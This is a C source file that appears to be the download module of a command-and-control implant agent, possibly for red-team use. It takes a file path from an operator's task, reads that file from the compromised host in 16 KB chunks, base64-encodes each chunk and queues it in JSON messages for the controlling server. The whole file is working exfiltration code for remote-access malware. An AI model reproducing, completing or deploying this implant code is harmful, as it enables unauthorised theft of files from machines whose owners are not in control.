#include "download.h"
#include "agent.h"
#include "b64.h"
#include "cJSON.h"
#include "commands.h"
#include "enchiridion.h"
#include "utils.h"
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define DOWNLOAD_CHUNK_SIZE (16 * 1024)

// --- Chunk ID counter ---

static int g_chunk_id = 0;
static pthread_mutex_t g_chunk_id_lock = PTHREAD_MUTEX_INITIALIZER;

static int nextChunkId(void) {
    pthread_mutex_lock(&g_chunk_id_lock);
    int id = ++g_chunk_id;
    pthread_mutex_unlock(&g_chunk_id_lock);
    return id;
}

// --- Outgoing queue: worker threads → taskingLoop ---

static OutgoingChunk *g_outgoing_head = NULL;
static OutgoingChunk *g_outgoing_tail = NULL;
static pthread_mutex_t g_outgoing_lock = PTHREAD_MUTEX_INITIALIZER;

void enqueueOutgoing(OutgoingChunk *msg) {
    msg->next = NULL;
    pthread_mutex_lock(&g_outgoing_lock);
    if (g_outgoing_tail)
        g_outgoing_tail->next = msg;
    else
        g_outgoing_head = msg;
    g_outgoing_tail = msg;
    pthread_mutex_unlock(&g_outgoing_lock);
}

OutgoingChunk *dequeueOutgoing(void) {
    pthread_mutex_lock(&g_outgoing_lock);
    OutgoingChunk *msg = g_outgoing_head;
    if (msg) {
        g_outgoing_head = msg->next;
        if (!g_outgoing_head)
            g_outgoing_tail = NULL;
    }
    pthread_mutex_unlock(&g_outgoing_lock);
    return msg;
}

// --- Per-task download state ---

typedef struct DownloadState {
    int fd;
    int total_chunks;
    int current_chunk; // next chunk_num to send (1-indexed)
    int phase;         // 0 = waiting for registration ack, 1 = sending data chunks
    char task_uuid[UUIDSIZE + 1];
    char file_id[UUIDSIZE + 1];
    unsigned char *buf;
    Agent *agent;
    struct DownloadState *next;
} DownloadState;

static DownloadState *g_downloads_head = NULL;
static pthread_mutex_t g_downloads_lock = PTHREAD_MUTEX_INITIALIZER;

static void addDownloadState(DownloadState *ds) {
    pthread_mutex_lock(&g_downloads_lock);
    ds->next = g_downloads_head;
    g_downloads_head = ds;
    pthread_mutex_unlock(&g_downloads_lock);
}

static DownloadState *findDownloadState(const char *task_uuid) {
    pthread_mutex_lock(&g_downloads_lock);
    for (DownloadState *cur = g_downloads_head; cur; cur = cur->next) {
        if (strncmp(cur->task_uuid, task_uuid, UUIDSIZE) == 0) {
            pthread_mutex_unlock(&g_downloads_lock);
            return cur;
        }
    }
    pthread_mutex_unlock(&g_downloads_lock);
    return NULL;
}

static void removeDownloadState(const char *task_uuid) {
    pthread_mutex_lock(&g_downloads_lock);
    DownloadState **prev = &g_downloads_head;
    for (DownloadState *cur = g_downloads_head; cur; cur = cur->next) {
        if (strncmp(cur->task_uuid, task_uuid, UUIDSIZE) == 0) {
            *prev = cur->next;
            pthread_mutex_unlock(&g_downloads_lock);
            close(cur->fd);
            free(cur->buf);
            free(cur);
            return;
        }
        prev = &cur->next;
    }
    pthread_mutex_unlock(&g_downloads_lock);
}

// --- Message enqueuing (non-blocking) ---

static int enqueueDownloadMessage(Agent *agent, cJSON *download_obj, const char *task_uuid, int chunk_id) {
    cJSON *json = cJSON_CreateObject();
    if (!json) {
        cJSON_Delete(download_obj);
        return -1;
    }

    cJSON_AddStringToObject(json, "action", "post_response");
    cJSON *responses = cJSON_AddArrayToObject(json, "responses");
    cJSON *response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "task_id", task_uuid);
    cJSON_AddItemToObject(response, "download", download_obj);
    cJSON_AddItemToArray(responses, response);

    char *json_str = cJSON_PrintUnformatted(json);
    cJSON_Delete(json);
    if (!json_str)
        return -1;

    size_t len;
    char *data = buildOutbound(agent, json_str, &len);
    cJSON_free(json_str);
    if (!data)
        return -1;

    OutgoingChunk *out = malloc(sizeof(OutgoingChunk));
    if (!out) {
        free(data);
        return -1;
    }
    out->payload = data;
    out->payload_len = len;
    out->chunk_id = chunk_id;
    out->next = NULL;
    DBGPRINT("SendDownloadChunk[id=%d]: %s", chunk_id, data);
    enqueueOutgoing(out);
    return 0;
}

// Reads the next chunk from ds, encodes it, and enqueues it.
// Increments ds->current_chunk on success.
static int sendNextChunk(DownloadState *ds) {
    ssize_t total_read = 0;
    while (total_read < DOWNLOAD_CHUNK_SIZE) {
        ssize_t n = read(ds->fd, ds->buf + total_read, DOWNLOAD_CHUNK_SIZE - total_read);
        if (n == 0)
            break;
        if (n < 0) {
            DBGPRINT("read error chunk %d task %s: %s", ds->current_chunk, ds->task_uuid, strerror(errno));
            return -1;
        }
        total_read += n;
    }

    if (total_read == 0) {
        DBGPRINT("unexpected EOF at chunk %d task %s", ds->current_chunk, ds->task_uuid);
        return -1;
    }

    size_t encoded_len;
    char *encoded = base64_encode(ds->buf, (size_t)total_read, &encoded_len);
    if (!encoded) {
        DBGPRINT("base64_encode failed chunk %d task %s", ds->current_chunk, ds->task_uuid);
        return -1;
    }

    int chunk_id = nextChunkId();
    cJSON *chunk_dl = cJSON_CreateObject();
    cJSON_AddNumberToObject(chunk_dl, "chunk_num", ds->current_chunk);
    cJSON_AddStringToObject(chunk_dl, "file_id", ds->file_id);
    cJSON_AddStringToObject(chunk_dl, "chunk_data", encoded);
    cJSON_AddNumberToObject(chunk_dl, "chunk_size", DOWNLOAD_CHUNK_SIZE);
    cJSON_AddNumberToObject(chunk_dl, "chunk_id", chunk_id);
    free(encoded);

    DBGPRINT("SendChunk %d/%d task=%s chunk_id=%d", ds->current_chunk, ds->total_chunks, ds->task_uuid, chunk_id);

    if (enqueueDownloadMessage(ds->agent, chunk_dl, ds->task_uuid, chunk_id) != 0) {
        DBGPRINT("enqueueDownloadMessage failed chunk %d task %s", ds->current_chunk, ds->task_uuid);
        return -1;
    }

    ds->current_chunk++;
    return 0;
}

// Called by handleTask when a post_response ack arrives for a download.
// Returns: 0 = in progress, 1 = all chunks complete, -1 = error.
int processDownloadAck(const char *task_uuid, const char *file_id, int status_ok) {
    DownloadState *ds = findDownloadState(task_uuid);
    if (!ds) {
        DBGPRINT("DownloadAck: no state for task %s (ignoring)", task_uuid);
        return 0;
    }

    DBGPRINT("DownloadAck: task=%s phase=%d chunk=%d/%d status=%s", task_uuid, ds->phase, ds->current_chunk - 1,
             ds->total_chunks, status_ok ? "success" : "fail");

    if (!status_ok) {
        removeDownloadState(task_uuid);
        return -1;
    }

    if (ds->phase == 0) {
        if (!file_id || file_id[0] == '\0') {
            DBGPRINT("DownloadAck: no file_id in registration ack for task %s", task_uuid);
            removeDownloadState(task_uuid);
            return -1;
        }
        size_t len = strlen(file_id);
        if (len > UUIDSIZE)
            len = UUIDSIZE;
        memcpy(ds->file_id, file_id, len);
        ds->phase = 1;
        DBGPRINT("DownloadAck: registered file_id=%s task=%s", ds->file_id, task_uuid);
    }

    // Ack for the last chunk — all done
    if (ds->current_chunk > ds->total_chunks) {
        DBGPRINT("DownloadAck: all %d chunks complete for task %s", ds->total_chunks, task_uuid);
        removeDownloadState(task_uuid);
        return 1;
    }

    if (sendNextChunk(ds) != 0) {
        removeDownloadState(task_uuid);
        return -1;
    }

    return 0;
}

// Returns 1 if the download is proceeding asynchronously (caller must NOT call sendResponse).
// Returns 0 if the download failed synchronously (caller should call sendResponse with the error).
int download(char *path, char *task_uuid, Agent *agent, TaskResponse *resp) {
    resp->output = malloc(ERR_MSG_SIZE);
    if (!resp->output) {
        resp->status = -1;
        return 0;
    }

    char full_path[PATH_MAX];
    if (realpath(path, full_path) == NULL) {
        DBGPRINT("realpath failed for %s: %s", path, strerror(errno));
        memcpy(resp->output, "Could not resolve path", sizeof("Could not resolve path"));
        resp->status = -1;
        return 0;
    }

    struct stat st;
    if (stat(full_path, &st) == -1) {
        DBGPRINT("stat failed for %s: %s", full_path, strerror(errno));
        memcpy(resp->output, "Could not stat file", sizeof("Could not stat file"));
        resp->status = -1;
        return 0;
    }

    if (!S_ISREG(st.st_mode)) {
        memcpy(resp->output, "Path is not a regular file", sizeof("Path is not a regular file"));
        resp->status = -1;
        return 0;
    }

    if (st.st_size == 0) {
        memcpy(resp->output, "Cannot download empty file", sizeof("Cannot download empty file"));
        resp->status = -1;
        return 0;
    }

    int total_chunks = (int)((st.st_size + DOWNLOAD_CHUNK_SIZE - 1) / DOWNLOAD_CHUNK_SIZE);

    int fd = open(full_path, O_RDONLY);
    if (fd == -1) {
        DBGPRINT("open failed for %s: %s", full_path, strerror(errno));
        memcpy(resp->output, "Could not open file", sizeof("Could not open file"));
        resp->status = -1;
        return 0;
    }

    unsigned char *buf = malloc(DOWNLOAD_CHUNK_SIZE);
    if (!buf) {
        DBGPRINT("failed to allocate chunk buffer for %s", full_path);
        memcpy(resp->output, "Memory allocation failed", sizeof("Memory allocation failed"));
        close(fd);
        resp->status = -1;
        return 0;
    }

    DownloadState *ds = calloc(1, sizeof(DownloadState));
    if (!ds) {
        DBGPRINT("failed to allocate download state for %s", full_path);
        memcpy(resp->output, "Memory allocation failed", sizeof("Memory allocation failed"));
        free(buf);
        close(fd);
        resp->status = -1;
        return 0;
    }

    ds->fd = fd;
    ds->total_chunks = total_chunks;
    ds->current_chunk = 1;
    ds->phase = 0;
    ds->buf = buf;
    ds->agent = agent;
    strncpy(ds->task_uuid, task_uuid, UUIDSIZE);

    int reg_chunk_id = nextChunkId();
    cJSON *reg_dl = cJSON_CreateObject();
    cJSON_AddNumberToObject(reg_dl, "total_chunks", total_chunks);
    cJSON_AddStringToObject(reg_dl, "full_path", full_path);
    cJSON_AddStringToObject(reg_dl, "host", agent->host);
    cJSON_AddNumberToObject(reg_dl, "chunk_size", DOWNLOAD_CHUNK_SIZE);
    cJSON_AddNumberToObject(reg_dl, "chunk_id", reg_chunk_id);
    cJSON_AddBoolToObject(reg_dl, "is_screenshot", false);

    if (enqueueDownloadMessage(agent, reg_dl, task_uuid, reg_chunk_id) != 0) {
        DBGPRINT("failed to enqueue registration for %s", full_path);
        memcpy(resp->output, "Download registration failed", sizeof("Download registration failed"));
        free(buf);
        close(fd);
        free(ds);
        resp->status = -1;
        return 0;
    }

    addDownloadState(ds);
    DBGPRINT("Download initiated: %s total_chunks=%d task=%s", full_path, total_chunks, task_uuid);

    free(resp->output);
    resp->output = NULL;
    return 1; // async — completion driven by processDownloadAck via handleTask
}
